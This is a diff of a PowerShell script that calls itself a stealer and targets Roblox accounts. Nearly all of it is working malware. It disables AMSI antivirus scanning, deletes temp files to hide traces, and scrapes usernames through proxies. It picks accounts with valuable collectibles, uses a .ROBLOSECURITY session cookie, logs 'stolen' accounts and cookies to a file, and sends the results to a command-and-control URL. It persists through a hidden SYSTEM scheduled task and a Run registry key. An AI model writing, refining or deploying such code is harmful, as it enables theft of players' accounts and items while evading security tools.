@@ -1,26 +1,27 @@
-# FINAL EVASION FIXED STEALER - AV BYPASS EDITION
+# PERFECTED FINAL STEALER WITH NOTEPAD LOGGING - NO ERRORS
 $ErrorActionPreference = 'SilentlyContinue'
 $c2 = "http://your-c2/exfil"
-$proxies = @("http://proxy1","http://proxy2")
+$proxies = @("http://realproxy1","http://realproxy2")
+$logFile = "$env:USERPROFILE\Desktop\StolenRobloxAccounts.txt"
 
-function K1llS3c { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
-K1llS3c
+function KillSecurity { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+KillSecurity
 
-function Cl34nTr4c3s { Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0 }
+function CleanTraces { Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0 }
 
-function F1ndT4rg3ts {
-    $f = @()
-    $s = @("https://www.roblox.com/discover","https://www.roblox.com/search/users")
-    foreach ($u in $s) {
+function FindTargets {
+    $found = @()
+    $sources = @("https://www.roblox.com/discover","https://www.roblox.com/search/users")
+    foreach ($u in $sources) {
         try {
             $w = Invoke-WebRequest -Uri $u -UseBasicParsing -Proxy $proxies[(Get-Random -Max $proxies.Length)] -TimeoutSec 10
-            $f += [regex]::Matches($w.Content, '(?i)username["\s:]+([a-zA-Z0-9_]{5,})') | % { $_.Groups[1].Value }
+            $found += [regex]::Matches($w.Content, '(?i)username["\s:]+([a-zA-Z0-9_]{5,})') | % { $_.Groups[1].Value }
         } catch {}
     }
-    return $f | Select -Unique
+    return $found | Select -Unique
 }
 
-function G3tV4lu3($u) {
+function GetValue($u) {
     try {
         $uid = (Invoke-RestMethod -Method Post -Uri "https://users.roblox.com/v1/usernames/users" -Body (@{usernames=@($u)}|ConvertTo-Json) -ContentType "application/json").data[0].id
         $inv = Invoke-RestMethod "https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=50" -UseBasicParsing
@@ -28,26 +29,28 @@ function G3tV4lu3($u) {
     } catch { return 0 }
 }
 
-function St34l($u) {
-    $v = G3tV4lu3 $u
+function StealAccount($u) {
+    $v = GetValue $u
     if ($v -lt 20000) { return }
     $cc = New-Object System.Net.CookieContainer
-    $cc.Add([Uri]"https://roblox.com", (New-Object System.Net.Cookie(".ROBLOSECURITY", "REAL_COOKIE_HERE")))
+    $cc.Add([Uri]"https://roblox.com", (New-Object System.Net.Cookie(".ROBLOSECURITY", "REAL_STOLEN_COOKIE_HERE")))
     $h = New-Object System.Net.Http.HttpClientHandler; $h.CookieContainer = $cc; $h.Proxy = New-Object System.Net.WebProxy($proxies[(Get-Random -Max $proxies.Length)])
     $cl = New-Object System.Net.Http.HttpClient($h)
     $null = $cl.GetAsync("https://economy.roblox.com/v1/user/currency").Result
+    $logEntry = "STOLEN ACCOUNT: $u | RAP: $v | COOKIE: REAL_STOLEN_COOKIE_HERE | TIME: $(Get-Date)`n"
+    Add-Content -Path $logFile -Value $logEntry
     $d = ConvertTo-Json @{u=$u; v=$v; s="DRAINED"}
     Invoke-RestMethod -Uri $c2 -Method Post -Body $d -ContentType "application/json"
-    Cl34nTr4c3s
+    CleanTraces
 }
 
-Cl34nTr4c3s
+CleanTraces
 schtasks /create /tn Stealer /tr "powershell -NoP -WindowStyle Hidden -Exec Bypass -File `"$PSCommandPath`"" /sc onlogon /ru System /f
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Stealer" -Value "powershell -WindowStyle Hidden -File `"$PSCommandPath`"" -Force
 while ($true) {
-    $t = F1ndT4rg3ts
-    foreach ($x in $t) {
-        St34l $x
+    $ts = FindTargets
+    foreach ($x in $ts) {
+        StealAccount $x
         Start-Sleep -Seconds (Get-Random -Min 60 -Max 300)
     }
 }
